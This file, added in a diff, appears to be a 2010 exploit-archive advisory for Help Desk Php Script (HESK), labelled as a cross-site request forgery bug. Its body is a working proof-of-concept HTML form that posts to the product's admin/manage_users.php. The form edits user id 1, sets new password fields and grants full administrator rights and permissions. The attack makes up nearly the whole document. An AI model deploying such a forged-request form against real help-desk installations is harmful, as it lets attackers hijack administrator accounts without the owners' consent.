@@ -1,0 +1,37 @@
+#############################################################
+# Application Name : Help Desk Php Script
+# Date : 11.01.2010
+# Vulnerable Type : XSRF
+# Infection : Admin cookilerini De&#287;i&#351;tirilebilinir.
+# author : The.Morpheus
+#############################################################
+
+< ------------------- header data end of ------------------- >
+
+< -- bug code start -- >
+<h3>The.Morpheus</h3>
+<form method="post" action="http://www.hesk.com/demo/admin/manage_users.php?a=edit&id=1">
+<input type="text" name="name" size="40" maxlength="50" value="John Doe" /></td>
+<input type="text" name="email" size="40" maxlength="255" value="john@doe.com<mailto:john@doe.com>" /></td>
+<input type="text" name="user" size="40" maxlength="20" value="Demo" /></td>
+<input type="password" name="newpass" size="40" maxlength="20" /></td>
+<input type="password" name="newpass2" size="40" maxlength="20" /></td>
+<input type="radio" name="isadmin" value="1" onclick="Javascript:hesk_toggleLayerDisplay('options')" checked="checked" /> YES (access to all features and categories)</label><br />
+<input type="radio" name="isadmin" value="0" onclick="Javascript:hesk_toggleLayerDisplay('options')" /> NO (you can limit features and categories)</label>
+<input type="checkbox" name="categories[]" value="2" checked="checked" /> Support</label><br /><label><input type="checkbox" name="categories[]" value="3" /> Billing</label><br /><label><input type="checkbox" name="categories[]" value="4" /> Advertising</label><br /><label><input type="checkbox" name="categories[]" value="1" /> General</label><br />  
+<input type="checkbox" name="features[]" value="can_view_tickets" checked="checked" />View tickets<sup>1</sup></label><br />
+<input type="checkbox" name="features[]" value="can_edit_tickets" />Edit ticket replies<sup>1</sup></label><br />
+<input type="checkbox" name="features[]" value="can_del_notes" />Delete any ticket notes<sup>1, 2</sup></label><br />
+<input type="checkbox" name="features[]" value="can_change_cat" checked="checked" />Change ticket category<sup>1</sup></label><br />
+<input type="checkbox" name="features[]" value="can_man_kb" />Manage knowledgebase</label><br />
+<input type="checkbox" name="features[]" value="can_man_users" />Manage users</label><br />
+<input type="checkbox" name="features[]" value="can_man_cat" />Manage categories</label><br />
+<input type="checkbox" name="features[]" value="can_man_canned" />Manage canned responses</label><br />
+<input type="checkbox" name="features[]" value="can_man_settings" />Manage help desk settings</label><br />
+><input type="checkbox" name="features[]" value="can_add_archive" />Can add tickets to archive</label><br />
+<input type="hidden" name="a" value="save" />
+<input type="hidden" name="userid" value="1" />
+<input type="submit" value="Save changes" class="orangebutton" onmouseover="hesk_btn(this,'orangebuttonover');" onmouseout="hesk_btn(this,'orangebutton');" /></p>
+</form>
+
+< -- bug code end of -- >
